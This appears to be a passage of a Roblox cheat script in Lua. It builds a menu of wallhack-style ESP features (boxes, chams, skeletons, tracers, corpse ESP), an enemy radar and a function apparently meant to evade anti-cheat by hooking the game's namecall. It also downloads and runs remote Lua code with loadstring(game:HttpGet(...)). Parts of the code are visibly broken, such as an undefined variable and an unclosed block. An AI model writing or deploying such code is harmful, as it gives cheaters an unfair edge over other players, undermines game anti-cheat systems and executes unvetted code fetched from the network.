                            esp.tracer.Visible = true
                            esp.tracer.From = Vector2.new(camera.ViewportSize.X / 2, tracerY)
                            esp.tracer.To = Vector2.new(hrp2D.X, hrp2D.Y)            
                        end
                    else
                        esp.tracer.Visible = false
                    end
                else
                    for _, drawing in pairs(esp) do
                        drawing.Visible = false
                    end
                    for _, lineData in ipairs(esp["skeletonlines"]) do
                        local skeletonLine = lineData[1]
                        skeletonLine:Remove()
                    end
                    esp["skeletonlines"] = {}
                    for _, line in ipairs(esp.boxLines) do
                        line:Remove()
                    end
                    esp.boxLines = {}
                end
            else
                for _, drawing in pairs(esp) do
                    drawing.Visible = false
                end
                for _, lineData in ipairs(esp["skeletonlines"]) do
                    local skeletonLine = lineData[1]
                    skeletonLine:Remove()
                end
                esp["skeletonlines"] = {}
                for _, line in ipairs(esp.boxLines) do
                    line:Remove()
                end
                esp.boxLines = {}
            end
        else
            for _, drawing in pairs(esp) do
                drawing.Visible = false
            end
            for _, lineData in ipairs(esp["skeletonlines"]) do
                local skeletonLine = lineData[1]
                skeletonLine:Remove()
            end
            esp["skeletonlines"] = {}
            for _, line in ipairs(esp.boxLines) do
                line:Remove()
            end
            esp.boxLines = {}
        end
    end
end


for _, player in ipairs(Players:GetPlayers()) do
    if player ~= localPlayer then
        createEsp(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= localPlayer then
        createEsp(player)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    removeEsp(player)
end)

RunService.RenderStepped:Connect(updateEsp)


EnemyEspTab:AddToggle('Corner Box Esp', {
    Text = 'Corner Box Esp',
    Default = false,
    Callback = function(stinkyvalue)
    



ESP_SETTINGS.ShowBox = stinkyvalue
ESP_SETTINGS.BoxType = "Corner Box Esp"


    end
})

EnemyEspTab:AddLabel('Box Esp Color Picker'):AddColorPicker('Box Esp Color Picker', {
    Default = Color3.fromRGB(255, 255, 255),  
    Title = 'Box Esp Color Picker',
    Transparency = 0,                         

    Callback = function(Value)

        espLib.options.boxesColor = Value     
    end
})



EnemyEspTab:AddToggle('boxswitch', {
    Text = 'Boxes',
    Default = false,
    Callback = function(enabled)
        espLib.options.boxes = enabled
    end
})

EnemyEspTab:AddToggle('Outofviewarrors', {
    Text = 'Out Of View Arrows',
    Default = false,
    Callback = function(enabled)
        espLib.options.outOfViewArrows = enabled
    end
})

EnemyEspTab:AddToggle('Outofviewarrors', {
    Text = 'Out Of View Arrows Filled',
    Default = false,
    Callback = function(enabled)
        espLib.options.outOfViewArrowsFilled = enabled
    end
})

EnemyEspTab:AddSlider('outofviewarrorsslider', {
    Text = 'Out Of View Arrows Size',
    Default = 25,
    Min = 5,
    Max = 40,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        espLib.options.outOfViewArrowsSize = Value
        
    end
})

EnemyEspTab:AddSlider('outofviewarrorssliderRadius', {
    Text = 'Out Of View Arrows Radius',
    Default = 100,
    Min = 20,
    Max = 500,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        espLib.options.outOfViewArrowsRadius = Value
        
    end
})

EnemyEspTab:AddSlider('outofviewarrorsslidertRANSPARENCY', {
    Text = 'Out Of View Arrows Transparency',
    Default = 0.5,
    Min = 0.1,
    Max = 1,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        espLib.options.outOfViewArrowsTransparency = Value
        
    end
})

EnemyEspTab:AddToggle('visiblecheck', {
    Text = 'Visible Check',
    Default = false,
    Callback = function(enabled)
      --  espLib.options.visibleOnly = enabled
    end
})


EnemyEspTab:AddLabel('Chams Esp Color Picker'):AddColorPicker('Chams Esp Color Picker', {
    Default = Color3.fromRGB(255, 255, 255),  
    Title = 'Chams Esp Color Picker',
    Transparency = 0,                         

    Callback = function(Value)
        
        espLib.options.chamsFillColor = Value     
    end
})


EnemyEspTab:AddToggle('chamswwt', {
    Text = 'Chams',
    Default = false,
    Callback = function(enabled)
        espLib.options.chams = enabled
    end
})

function _z5attclientanticheat(___meta)

warn("Attempt 1:")
wait(0.3)
--[[
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        local Method = getnamecallmethod()
        local Args = {...}
        if Method == "FireServer" and self.Name == "ProjectileInflict" and true then
            if Args[1] == game.Players.LocalPlayer.Character.HumanoidRootPart then
                return coroutine.yield()
            end
        end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
    --]]
warn("attempt end")
wait(0.5)
warn("Attempt 2:")
setfpscap(1)
wait(1.3)
setfpscap(999999999)
end

EnemyEspTab:AddToggle('distance', {
    Text = 'Distance',
    Default = false,
    Callback = function(enabled)
        espLib.options.distance = enabled
    end
})



EnemyEspTab:AddToggle('healthtext', {
    Text = 'Health Text',
    Default = false,
    Callback = function(enabled)
        espLib.options.healthText = enabled
    end
})

EnemyEspTab:AddLabel('Health Esp Color Picker'):AddColorPicker('Health Esp Color Picker', {
    Default = Color3.fromRGB(0, 255, 0),  
    Title = 'Health Esp Color Picker',
    Transparency = 0,                         

    Callback = function(Value)
        
        espLib.options.healthBarsColor = Value     
    end
})

EnemyEspTab:AddToggle('healthbar', {
    Text = 'Health Bar',
    Default = false,
    Callback = function(enabled)
        espLib.options.healthBars = enabled
    end
})

EnemyEspTab:AddToggle('names', {
    Text = 'Names',
    Default = false,
    Callback = function(enabled)
        espLib.options.names = enabled
    end
})



EnemyEspTab:AddToggle('limitdistance', {
    Text = 'Limit Distance',
    Default = false,
    Callback = function(enabled)
        espLib.options.limitDistance = enabled
    end
})

EnemyEspTab:AddSlider('distancelimit', {
    Text = 'Distance Limit',
    Default = 900,
    Min = 10,
    Max = 1000,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        espLib.options.maxDistance = Value
        
    end
})



local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()
local Camera = game:service("Workspace").CurrentCamera
local RS = game:service("RunService")
local UIS = game:service("UserInputService")

repeat wait() until Player.Character ~= nil and Player.Character.PrimaryPart ~= nil

local LerpColorModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/lerpcolormoaddule.lua"))()
local HealthBarLerp = LerpColorModule:Lerp(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0))

local function NewCircle(Transparency, Color, Radius, Filled, Thickness)
    local c = Drawing.new("Circle")
    c.Transparency = Transparency
    c.Color = Color
    c.Visible = false
    c.Thickness = Thickness
    c.Position = Vector2.new(0, 0)
    c.Radius = Radius
    c.NumSides = math.clamp(Radius * 55 / 100, 10, 75)
    c.Filled = Filled
    return c
end

local RadarInfo = {
    Position = Vector2.new(200, 200),
    Radius = 100,
    Scale = 1,
    RadarBack = Color3.fromRGB(10, 10, 10),
    RadarBorder = Color3.fromRGB(75, 75, 75),
    LocalPlayerDot = Color3.fromRGB(255, 255, 255),
    PlayerDot = Color3.fromRGB(60, 170, 255),
    Team = Color3.fromRGB(0, 255, 0),
    Enemy = Color3.fromRGB(255, 0, 0),
    Health_Color = true,
    Team_Check = true
}

local RadarBackground = NewCircle(0.9, RadarInfo.RadarBack, RadarInfo.Radius, true, 1)
local RadarBorder = NewCircle(0.75, RadarInfo.RadarBorder, RadarInfo.Radius, false, 3)

local function GetRelative(pos)
    local char = Player.Character
    if char and char.PrimaryPart then
        local pmpart = char.PrimaryPart
        local camerapos = Vector3.new(Camera.CFrame.Position.X, pmpart.Position.Y, Camera.CFrame.Position.Z)
        local newcf = CFrame.new(pmpart.Position, camerapos)
        local r = newcf:PointToObjectSpace(pos)
        return r.X, r.Z
    else
        return 0, 0
    end
end

local function PlaceDot(plr)
    local PlayerDot = NewCircle(1, RadarInfo.PlayerDot, 3, true, 1)
    PlayerDot.Visible = false  

    local function Update()
        local c
        c = RS.RenderStepped:Connect(function()
            if RadarBackground.Visible then  
                local char = plr.Character
                if char and char:FindFirstChildOfClass("Humanoid") and char.PrimaryPart and char:FindFirstChildOfClass("Humanoid").Health > 0 then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local scale = RadarInfo.Scale
                    local relx, rely = GetRelative(char.PrimaryPart.Position)
                    local newpos = RadarInfo.Position - Vector2.new(relx * scale, rely * scale)

                    if (newpos - RadarInfo.Position).magnitude < RadarInfo.Radius - 2 then
                        PlayerDot.Radius = 3
                        PlayerDot.Position = newpos
                        PlayerDot.Visible = true
                    else
                        local dist = (RadarInfo.Position - newpos).magnitude
                        local calc = (RadarInfo.Position - newpos).unit * (dist - RadarInfo.Radius)
                        local inside = Vector2.new(newpos.X + calc.X, newpos.Y + calc.Y)
                        PlayerDot.Radius = 2
                        PlayerDot.Position = inside
                        PlayerDot.Visible = true
                    end

                    PlayerDot.Color = RadarInfo.PlayerDot
                    if RadarInfo.Team_Check then
                        if plr.TeamColor == Player.TeamColor then
                            PlayerDot.Color = RadarInfo.Team
                        else
                            PlayerDot.Color = RadarInfo.Enemy
                        end
                    end

                    if RadarInfo.Health_Color then
                        PlayerDot.Color = HealthBarLerp(hum.Health / hum.MaxHealth)
                    end
                else
                    PlayerDot.Visible = false
                    if Players:FindFirstChild(plr.Name) == nil then
                        PlayerDot:Remove()
                        c:Disconnect()
                    end
                end
            else
                PlayerDot.Visible = false
            end
        end)
    end
    coroutine.wrap(Update)()
end

for _, v in pairs(game.Players:GetPlayers()) do
    if v.Name ~= Player.Name then
        PlaceDot(v)
    end
end


local function NewLocalDot()
    local d = Drawing.new("Triangle")
    d.Visible = false  
    d.Thickness = 1
    d.Filled = true
    d.Color = RadarInfo.LocalPlayerDot
    d.PointA = RadarInfo.Position + Vector2.new(0, -6)
    d.PointB = RadarInfo.Position + Vector2.new(-3, 6)
    d.PointC = RadarInfo.Position + Vector2.new(3, 6)
    return d
end

local LocalPlayerDot = NewLocalDot()

game.Players.PlayerAdded:Connect(function(v)
    if v.Name ~= Player.Name then
        PlaceDot(v)
    end
    LocalPlayerDot:Remove()
    LocalPlayerDot = NewLocalDot()
end)


local function UpdateRadarVisibility(visible)
    RadarBackground.Visible = visible
    RadarBorder.Visible = visible
    LocalPlayerDot.Visible = visible
    for _, v in pairs(Players:GetChildren()) do
        if v.Name ~= Player.Name then
            local dot = v:FindFirstChild("RadarDot")
            if dot then
                dot.Visible = visible
            end
        end
    end
end


if EnemyEspTab and EnemyEspTab.AddToggle then
    EnemyEspTab:AddToggle('minimap', {
        Text = 'Minimap',
        Default = false,
        Callback = function(first)
            UpdateRadarVisibility(first)
        end
    })
else
    warn("EnemyEspTab or AddToggle method not found")
end


if EnemyEspTab and EnemyEspTab.GetToggleState then
    local success, toggleState = pcall(function() return EnemyEspTab:GetToggleState('minimap') end)
    if success then
        UpdateRadarVisibility(toggleState)
    else
        warn("Failed to get toggle state for 'minimap'")
    end
else
    warn("EnemyEspTab or GetToggleState method not found")
end


coroutine.wrap(function()
    local c
    c = RS.RenderStepped:Connect(function()
        if LocalPlayerDot then
            LocalPlayerDot.Color = RadarInfo.LocalPlayerDot
            LocalPlayerDot.PointA = RadarInfo.Position + Vector2.new(0, -6)
            LocalPlayerDot.PointB = RadarInfo.Position + Vector2.new(-3, 6)
            LocalPlayerDot.PointC = RadarInfo.Position + Vector2.new(3, 6)
        end
        RadarBackground.Position = RadarInfo.Position
        RadarBackground.Radius = RadarInfo.Radius
        RadarBackground.Color = RadarInfo.RadarBack

        RadarBorder.Position = RadarInfo.Position
        RadarBorder.Radius = RadarInfo.Radius
        RadarBorder.Color = RadarInfo.RadarBorder
    end)
end)()


local inset = game:service("GuiService"):GetGuiInset()

local dragging = false
local offset = Vector2.new(0, 0)
UIS.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
        offset = RadarInfo.Position - Vector2.new(Mouse.X, Mouse.Y)
        dragging = true
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

coroutine.wrap(function()
    local dot = NewCircle(1, Color3.fromRGB(255, 255, 255), 3, true, 1)
    local c
    c = RS.RenderStepped:Connect(function()
        if (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
            dot.Position = Vector2.new(Mouse.X, Mouse.Y + inset.Y)
            dot.Visible = true
        else
            dot.Visible = false
        end
        if dragging then
            RadarInfo.Position = Vector2.new(Mouse.X, Mouse.Y) + offset
        end
    end)
end)()






local isESPEnabled = false 

local function DrawLine()
    local l = Drawing.new("Line")
    l.Visible = false
    l.From = Vector2.new(0, 0)
    l.To = Vector2.new(1, 1)
    l.Color = Color3.fromRGB(255, 255, 255) 
    l.Thickness = 1
    l.Transparency = 1
    return l
end

local function DrawESP(plr)
    repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil
    local limbs = {}
    local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) and true or false
    if R15 then 
        limbs = {
            
            Head_UpperTorso = DrawLine(),
            UpperTorso_LowerTorso = DrawLine(),
            
            UpperTorso_LeftUpperArm = DrawLine(),
            LeftUpperArm_LeftLowerArm = DrawLine(),
            LeftLowerArm_LeftHand = DrawLine(),
            
            UpperTorso_RightUpperArm = DrawLine(),
            RightUpperArm_RightLowerArm = DrawLine(),
            RightLowerArm_RightHand = DrawLine(),
            
            LowerTorso_LeftUpperLeg = DrawLine(),
            LeftUpperLeg_LeftLowerLeg = DrawLine(),
            LeftLowerLeg_LeftFoot = DrawLine(),
            
            LowerTorso_RightUpperLeg = DrawLine(),
            RightUpperLeg_RightLowerLeg = DrawLine(),
            RightLowerLeg_RightFoot = DrawLine(),
        }
    else 
        limbs = {
            Head_Spine = DrawLine(),
            Spine = DrawLine(),
            LeftArm = DrawLine(),
            LeftArm_UpperTorso = DrawLine(),
            RightArm = DrawLine(),
            RightArm_UpperTorso = DrawLine(),
            LeftLeg = DrawLine(),
            LeftLeg_LowerTorso = DrawLine(),
            RightLeg = DrawLine(),
            RightLeg_LowerTorso = DrawLine()
        }
    end

    local function Visibility(state)
        for i, v in pairs(limbs) do
            v.Visible = state
        end
    end

    local function UpdaterR15()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if isESPEnabled then
                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                    local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                    if vis then
                        
                        local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                        if limbs.Head_UpperTorso.From ~= Vector2.new(H.X, H.Y) then
                            
                            local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
                            local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
                            
                            local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
                            local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
                            local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
                            
                            local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
                            local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
                            local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
                            
                            local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
                            local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
                            local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
                            
                            local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
                            local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
                            local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)

                            
                            limbs.Head_UpperTorso.From = Vector2.new(H.X, H.Y)
                            limbs.Head_UpperTorso.To = Vector2.new(UT.X, UT.Y)

                            
                            limbs.UpperTorso_LowerTorso.From = Vector2.new(UT.X, UT.Y)
                            limbs.UpperTorso_LowerTorso.To = Vector2.new(LT.X, LT.Y)

                            
                            limbs.UpperTorso_LeftUpperArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.UpperTorso_LeftUpperArm.To = Vector2.new(LUA.X, LUA.Y)

                            limbs.LeftUpperArm_LeftLowerArm.From = Vector2.new(LUA.X, LUA.Y)
                            limbs.LeftUpperArm_LeftLowerArm.To = Vector2.new(LLA.X, LLA.Y)

                            limbs.LeftLowerArm_LeftHand.From = Vector2.new(LLA.X, LLA.Y)
                            limbs.LeftLowerArm_LeftHand.To = Vector2.new(LH.X, LH.Y)

                            
                            limbs.UpperTorso_RightUpperArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.UpperTorso_RightUpperArm.To = Vector2.new(RUA.X, RUA.Y)

                            limbs.RightUpperArm_RightLowerArm.From = Vector2.new(RUA.X, RUA.Y)
                            limbs.RightUpperArm_RightLowerArm.To = Vector2.new(RLA.X, RLA.Y)

                            limbs.RightLowerArm_RightHand.From = Vector2.new(RLA.X, RLA.Y)
                            limbs.RightLowerArm_RightHand.To = Vector2.new(RH.X, RH.Y)

                            
                            limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(LUL.X, LUL.Y)

                            limbs.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(LUL.X, LUL.Y)
                            limbs.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(LLL.X, LLL.Y)

                            limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(LLL.X, LLL.Y)
                            limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(LF.X, LF.Y)

                            
                            limbs.LowerTorso_RightUpperLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.LowerTorso_RightUpperLeg.To = Vector2.new(RUL.X, RUL.Y)

                            limbs.RightUpperLeg_RightLowerLeg.From = Vector2.new(RUL.X, RUL.Y)
                            limbs.RightUpperLeg_RightLowerLeg.To = Vector2.new(RLL.X, RLL.Y)

                            limbs.RightLowerLeg_RightFoot.From = Vector2.new(RLL.X, RLL.Y)
                            limbs.RightLowerLeg_RightFoot.To = Vector2.new(RF.X, RF.Y)
                        end

                        if limbs.Head_UpperTorso.Visible ~= true then
                            Visibility(true)
                        end
                    else 
                        if limbs.Head_UpperTorso.Visible ~= false then
                            Visibility(false)
                        end
                    end
                else 
                    if limbs.Head_UpperTorso.Visible ~= false then
                        Visibility(false)
                    end
                    if game.Players:FindFirstChild(plr.Name) == nil then 
                        for i, v in pairs(limbs) do
                            v:Remove()
                        end
                        connection:Disconnect()
                    end
                end
            else
                if limbs.Head_UpperTorso.Visible ~= false then
                    Visibility(false)
                end
            end
        end)
    end

    local function UpdaterR6()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if isESPEnabled then
                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                    local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                    if vis then
                        local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                        if limbs.Head_Spine.From ~= Vector2.new(H.X, H.Y) then
                            local T_Height = plr.Character.Torso.Size.Y/2 - 0.2
                            local UT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, T_Height, 0)).p)
                            local LT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, -T_Height, 0)).p)

                            local LA_Height = plr.Character["Left Arm"].Size.Y/2 - 0.2
                            local LUA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, LA_Height, 0)).p)
                            local LLA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, -LA_Height, 0)).p)
                            local LH = Camera:WorldToViewportPoint(plr.Character["Left Arm"].Position)

                            local RA_Height = plr.Character["Right Arm"].Size.Y/2 - 0.2
                            local RUA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, RA_Height, 0)).p)
                            local RLA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, -RA_Height, 0)).p)
                            local RH = Camera:WorldToViewportPoint(plr.Character["Right Arm"].Position)

                            local LL_Height = plr.Character["Left Leg"].Size.Y/2 - 0.2
                            local LUL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, LL_Height, 0)).p)
                            local LLL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, -LL_Height, 0)).p)
                            local LF = Camera:WorldToViewportPoint(plr.Character["Left Leg"].Position)

                            local RL_Height = plr.Character["Right Leg"].Size.Y/2 - 0.2
                            local RUL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, RL_Height, 0)).p)
                            local RLL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -RL_Height, 0)).p)
                            local RF = Camera:WorldToViewportPoint(plr.Character["Right Leg"].Position)

                            
                            limbs.Head_Spine.From = Vector2.new(H.X, H.Y)
                            limbs.Head_Spine.To = Vector2.new(UT.X, UT.Y)

                            
                            limbs.Spine.From = Vector2.new(UT.X, UT.Y)
                            limbs.Spine.To = Vector2.new(LT.X, LT.Y)

                            
                            limbs.LeftArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.LeftArm.To = Vector2.new(LUA.X, LUA.Y)

                            limbs.LeftArm_UpperTorso.From = Vector2.new(LUA.X, LUA.Y)
                            limbs.LeftArm_UpperTorso.To = Vector2.new(LLA.X, LLA.Y)

                            limbs.LeftArm_UpperTorso.To = Vector2.new(LH.X, LH.Y)

                            
                            limbs.RightArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.RightArm.To = Vector2.new(RUA.X, RUA.Y)

                            limbs.RightArm_UpperTorso.From = Vector2.new(RUA.X, RUA.Y)
                            limbs.RightArm_UpperTorso.To = Vector2.new(RLA.X, RLA.Y)

                            limbs.RightArm_UpperTorso.To = Vector2.new(RH.X, RH.Y)

                            
                            limbs.LeftLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.LeftLeg.To = Vector2.new(LUL.X, LUL.Y)

                            limbs.LeftLeg_LowerTorso.From = Vector2.new(LUL.X, LUL.Y)
                            limbs.LeftLeg_LowerTorso.To = Vector2.new(LLL.X, LLL.Y)

                            limbs.LeftLeg_LowerTorso.To = Vector2.new(LF.X, LF.Y)

                            
                            limbs.RightLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.RightLeg.To = Vector2.new(RUL.X, RUL.Y)

                            limbs.RightLeg_LowerTorso.From = Vector2.new(RUL.X, RUL.Y)
                            limbs.RightLeg_LowerTorso.To = Vector2.new(RLL.X, RLL.Y)

                            limbs.RightLeg_LowerTorso.To = Vector2.new(RF.X, RF.Y)
                        end

                        if limbs.Head_Spine.Visible ~= true then
                            Visibility(true)
                        end
                    else 
                        if limbs.Head_Spine.Visible ~= false then
                            Visibility(false)
                        end
                    end
                else 
                    if limbs.Head_Spine.Visible ~= false then
                        Visibility(false)
                    end
                    if game.Players:FindFirstChild(plr.Name) == nil then 
                        for i, v in pairs(limbs) do
                            v:Remove()
                        end
                        connection:Disconnect()
                    end
                end
            else
                if limbs.Head_Spine.Visible ~= false then
                    Visibility(false)
                end
            end
        end)
    end

    if R15 then 
        UpdaterR15()
    else 
        UpdaterR6()
    end
end


local function ToggleESP()
    isESPEnabled = not isESPEnabled
    if isESPEnabled then
        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= Player then
                DrawESP(plr)
            end
        end
    else
        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= Player then
                for i, v in pairs(limbs) do
                    if v and v.Visible then
                        v:Remove()
                    end
                end
            end
        end
    end
end


EnemyEspTab:AddToggle('skeletonesp', {
    Text = 'Skeleton Esp',
    Default = false,
    Callback = function(first)
        ToggleESP()
    end
})

EnemyEspTab:AddToggle('FaceDirectionEsp', {
    Text = 'Face Direction Esp',
    Tooltip = 'Face Direction Esp',
    Default = false,

    Callback = function(first)



toggleTracersForAllPlayersExceptLocal(localPlayer)





       
    end
})




print('load_' .. tostring(counter))
counter = counter + 1
local WorldTab = Visuals:AddTab('world')
local Misc = Tabs.Misc:AddLeftGroupbox('misc1')
local movetab = Tabs.Misc:AddRightGroupbox('misc2')

local luatab = Tabs.Lua:AddRightGroupbox('dogelua');
do
    local Sky = game:GetService("Lighting"):FindFirstChildOfClass("Sky")
    if not Sky then Sky = Instance.new("Sky", Lighting) end
    local value = "Standard"
    local SkyBoxes = {
        ["Standard"] = { ["SkyboxBk"] = Sky.SkyboxBk, ["SkyboxDn"] = Sky.SkyboxDn, ["SkyboxFt"] = Sky.SkyboxFt, ["SkyboxLf"] = Sky.SkyboxLf, ["SkyboxRt"] = Sky.SkyboxRt, ["SkyboxUp"] = Sky.SkyboxUp, },
        ["Among Us"] = { ["SkyboxBk"] = "rbxassetid://5752463190", ["SkyboxDn"] = "rbxassetid://5752463190", ["SkyboxFt"] = "rbxassetid://5752463190", ["SkyboxLf"] = "rbxassetid://5752463190", ["SkyboxRt"] = "rbxassetid://5752463190", ["SkyboxUp"] = "rbxassetid://5752463190" },
        ["Doge"] = { ["SkyboxBk"] = "rbxassetid://159713165", ["SkyboxDn"] = "rbxassetid://159713165", ["SkyboxFt"] = "rbxassetid://5752463190", ["SkyboxLf"] = "rbxassetid://5752463190", ["SkyboxRt"] = "rbxassetid://159713165", ["SkyboxUp"] = "rbxassetid://159713165" },
        ["Spongebob"] = { ["SkyboxBk"] = "rbxassetid://277099484", ["SkyboxDn"] = "rbxassetid://277099500", ["SkyboxFt"] = "rbxassetid://277099554", ["SkyboxLf"] = "rbxassetid://277099531", ["SkyboxRt"] = "rbxassetid://277099589", ["SkyboxUp"] = "rbxassetid://277101591" },
        ["Deep Space"] = { ["SkyboxBk"] = "rbxassetid://159248188", ["SkyboxDn"] = "rbxassetid://159248183", ["SkyboxFt"] = "rbxassetid://159248187", ["SkyboxLf"] = "rbxassetid://159248173", ["SkyboxRt"] = "rbxassetid://159248192", ["SkyboxUp"] = "rbxassetid://159248176" },
        ["Winter"] = { ["SkyboxBk"] = "rbxassetid://510645155", ["SkyboxDn"] = "rbxassetid://510645130", ["SkyboxFt"] = "rbxassetid://510645179", ["SkyboxLf"] = "rbxassetid://510645117", ["SkyboxRt"] = "rbxassetid://510645146", ["SkyboxUp"] = "rbxassetid://510645195" },
        ["Clouded Sky"] = { ["SkyboxBk"] = "rbxassetid://252760981", ["SkyboxDn"] = "rbxassetid://252763035", ["SkyboxFt"] = "rbxassetid://252761439", ["SkyboxLf"] = "rbxassetid://252760980", ["SkyboxRt"] = "rbxassetid://252760986", ["SkyboxUp"] = "rbxassetid://252762652" },
        
    }



movetab:AddButton('no fog', function()
    if Lighting:FindFirstChildOfClass("Atmosphere") then
        Lighting:FindFirstChildOfClass("Atmosphere"):Destroy()
 end
 end)

WorldTab:AddToggle('Outofviewarrowsoutline', {
    Text = 'Out Of View Arrows Outline',
    Default = false,
    Callback = function(enabled)
        espLib.options.outOfViewArrowsOutline = enabled
    end
})

WorldTab:AddToggle('OutofviewarrowsFilled', {
    Text = 'Out Of View Arrows Filled',
    Default = false,
    Callback = function(enabled)
        espLib.options.outOfViewArrowsOutlineFilled = enabled
    end
})

WorldTab:AddToggle('Corpse Esp', {
    Text = 'Corpse Esp',
    Default = false,
    Callback = function(value)

corpseesplib3.enabled = value

    end
})

WorldTab:AddToggle('Limit Distance', {
    Text = 'Limit Distance Toggle',
    Default = true,
    Callback = function(value)

corpseesplib3.limitDistance = value

    end
})

WorldTab:AddSlider('Corpse Persist Time', {
    Text = 'Corpse Persist Time',
    Default = 600,
    Min = 100,
    Max = 1000,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        
corpseesplib3.corpsePersistTime = Value

    end
})	

WorldTab:AddSlider('Max Distance', {
    Text = 'Max Distance',
    Default = 500,
    Min = 100,
    Max = 790,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        
corpseesplib3.maxDistance = Value

    end
})
WorldTab:AddSlider('Font Size', {
    Text = 'Font Size',
    Default = 13,
    Min = 5,
    Max = 30,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        
corpseesplib3.textSize = Value

    end
})

WorldTab:AddSlider('Update Interval qfaf', {
    Text = 'Update Interval Corpse Esp',
    Default = 0.2,
    Min = 0.01,
    Max = 1,
    Rounding = 2,
    Compact = false,

    Callback = function(Value)
        
corpseesplib3.updateInterval = Value

    end
})


WorldTab:AddLabel('Corpse Color'):AddColorPicker('Corpse Color', {
    Default = Color3.new(1, 0, 0), 
    Title = 'Corpse Color',
    Transparency = 0,

    Callback = function(Value)
        corpseesplib3.corpseColor = Value
    end
})

WorldTab:AddLabel('Distance Color'):AddColorPicker('Distance Color', {
    Default = Color3.new(1, 1, 1), 
    Title = 'Distance Color',
    Transparency = 0,

    Callback = function(Value)
        corpseesplib3.distanceColor = Value
    end
})

WorldTab:AddLabel('Corpse Color'):AddColorPicker('Corpse Color', {
    Default = Color3.new(1, 0, 0), 
    Title = 'Corpse Color',
    Transparency = 0,

    Callback = function(Value)
        corpseesplib3.corpseColor = Value
    end
})




WorldTab:AddLabel('Bracket Color'):AddColorPicker('Bracket Color', {
    Default = Color3.new(1, 0, 0), 
    Title = 'Bracket Color',
    Transparency = 0,

    Callback = function(Value)
        corpseesplib3.bracketColor = Value
    end
})









makefolder("nexify661")
